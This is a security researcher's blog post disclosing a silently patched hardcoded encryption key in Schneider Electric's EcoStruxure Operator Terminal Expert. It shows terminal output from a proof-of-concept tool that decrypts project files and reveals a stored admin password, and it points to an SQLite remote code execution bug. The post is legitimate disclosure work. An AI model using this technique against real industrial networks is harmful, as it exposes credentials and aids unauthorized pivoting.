---
layout: post
title: "Silent Schneider :: Revealing a Hidden Patch in EcoStruxure Operator Terminal Expert"
date: 2020-02-18 10:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<p class="cn" markdown="1">Last month, [Chris](https://twitter.com/mufinnnnnnn) and I competed at [Pwn2Own Miami 2020](https://www.thezdi.com/blog/2020/1/21/pwn2own-miami-2020-schedule-and-live-results) targeting several ICS applications. One of the applications that we targeted was the Schneider Electric EcoStruxure Operator Terminal Expert. This blog post talks about a silent patch that was introduced before the competition that subsequently killed several bugs in our exploit chain.</p>
<!--more-->

<p class="cn">TL;DR</p>

<p class="cn" markdown="1">*In this post, one of the bugs that was in our chain will be revealed coupled with an exploit that can help network penetration testers and red teams to pivot through a compromised network.*</p>

## Overview

<p class="cn" markdown="1">As [Cim](https://twitter.com/Cim_Stordal) hints out in his [blog post](https://medium.com/cognite/pwn2own-or-not2pwn-part-1-3f152c44563e), he could pack and unpack project files even though encryption was in play. This is because one of the bugs that was silently patched was a hardcoded cryptographic key that was being used to encrypt and decrypt the project file.</p>

## Vulnerable Versions

<p class="cn" markdown="1">Since this was a silent patch, let's be clear about what was vulnerable and what was not:</p> 
<div markdown="1" class="cn">
- `EcoStruxure Operator Terminal Expert V3.1.iso` - SHA1: `386312d68ba5e6a98df24258f2fbcfb2d8c8521b`:

   This version is vulnerable and released 20/12/2019.

- `Installation_File_v3.1_SP1.zip` - SHA1: `229c8a5f9cdb1d63c2f9998d561a50a30e829d7a`:

   This version is *not* vulnerable and released 20/9/2019.
</div>

## Impact

<p class="cn" markdown="1">The project file (.vxdz) was a simple zip compressed file that could be extracted.</p>

```
saturn:~ mr_me$ unzip -d sample sample.vxdz 
Archive:  sample.vxdz
 extracting: sample/Alarm.db         
 extracting: sample/AllDataLogging.dat  
 extracting: sample/contents.inf     
 extracting: sample/Converters.dat   
 extracting: sample/hierarchy.inf    
 extracting: sample/Language.db      
 extracting: sample/logging.dat      
 extracting: sample/Project.dat      
 extracting: sample/Recipe.Binding.dat  
 extracting: sample/Recipe.db        
 extracting: sample/RecipeControls.dat  
 extracting: sample/scripts.inf      
 extracting: sample/Security.db      
 extracting: sample/SystemKeypad.inf  
 extracting: sample/Target.Binding.dat  
 extracting: sample/Target.dat       
 extracting: sample/Validations.dat  
 extracting: sample/Variables.db     
 extracting: sample/Screens/panel1.binding.dat  
 extracting: sample/Screens/panel1.dat  
 extracting: sample/Scripts/panel0.binding.dat  
 extracting: sample/Scripts/panel0.dat  
 extracting: sample/[Content_Types].xml  
saturn:~ mr_me$ file sample/Security.db
sample/Security.db: data
saturn:~ mr_me$ strings sample/Security.db 
]3uU
B[]~
J|)o
JdnAq
ER$_0
pPQ$M
```

<p class="cn" markdown="1">When attempting to determine the file types of the .db files and/or inspect their content, we can quickly see that the files are encrypted and compressed using deflate. Normally this wouldn't be an issue, but the Security.db file, it can contain sensitive information such as usernames and passwords.</p>

```
saturn:~ mr_me$ ./poc.py 
(+) usage: ./eco.py <projectfile> [options <pack/unpack>]
(+) eg: ./eco.py sample.vxdz unpack
(+) eg: ./eco.py sample.vxdz pack
saturn:~ mr_me$ ./poc.py sample.vxdz unpack
(+) unpacking to sample
(+) unpacking: sample/Validations.dat
(+) unpacking: sample/Screens/panel1.binding.dat
(+) unpacking: sample/Recipe.Binding.dat
(+) unpacking: sample/RecipeControls.dat
(+) unpacking: sample/hierarchy.inf
(+) unpacking: sample/Alarm.db
(+) unpacking: sample/Recipe.db
(+) unpacking: sample/Project.dat
(+) unpacking: sample/Screens/panel1.dat
(+) unpacking: sample/Language.db
(+) unpacking: sample/scripts.inf
(+) unpacking: sample/Target.Binding.dat
(+) unpacking: sample/Target.dat
(+) unpacking: sample/AllDataLogging.dat
(+) unpacking: sample/logging.dat
(+) unpacking: sample/Scripts/panel0.binding.dat
(+) unpacking: sample/Scripts/panel0.dat
(+) unpacking: sample/Converters.dat
(+) unpacking: sample/Security.db
(+) unpacking: sample/SystemKeypad.inf
(+) unpacking: sample/Variables.db
(+) unpacking: sample/contents.inf
(+) unpacking: sample/[Content_Types].xml
(+) unpacked and decrypted: sample.vxdz
saturn:~ mr_me$ file sample/Security.db 
sample/Security.db: SQLite 3.x database, last written using SQLite version 3008010
saturn:~ mr_me$ strings sample/Security.db | grep admin
admins
admin09cfb7e71f097ebfed99e3ca3ba5d8b9e26162e19d03949566df9a12097d3bb2
adminthe master admin userThisIsASecretPassword!^L4G
saturn:~ mr_me$
```

<p class="cn" markdown="1">Using the PoC we developed, it's possible to expose passwords inside of .vdxz files and in the example above, we can see that the password `ThisIsASecretPassword!` was exposed.</p>

<p class="cn" markdown="1">Furthermore, details of SQLite fts3_tokenizer Untrusted Pointer Remote Code Execution Vulnerability aka [CVE-2019-8602](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8602) was released in Checkpoint's excellent blog [post](https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/).</p>

<p class="cn" markdown="1">Not only was the FTS3 extension enabled in the SQLite binary for EcoStruxure Operator Terminal Expert, but it was also using an outdated version as well: `3.8.0.1`.</p>

```
saturn:~ mr_me$ file sample/Security.db 
sample/Security.db: SQLite 3.x database, last written using SQLite version 3008010
```

<p class="cn" markdown="1">The checkpoint blog post had all the formula to craft a working remote code execution exploit using just CVE-2019-8602.</p>

## Patch

<p class="cn" markdown="1">The patch that Schneider released in SP1 was essentially to encrypt files using a per project password, instead of using a hardcoded encryption key.</p>

{% include image.html
            img="assets/images/silent-schneider-revealing-a-hidden-patch-in-ecostruxure-operator-terminal-expert/patch.png"
            title="A per project password warning"
            caption="A per project password warning"
            style="width:50%;height:50%" %}

## Conclusion

<p class="cn" markdown="1">Whilst no CVE was issued, having knowledge of the hardcoded key may aid in network pivoting as sensitive information can be revealed if .vdxz files are found within a network.</p>

<p class="cn" markdown="1">An advisory and poc exploit can be found [here](/advisories/src-2020-0010/).</p>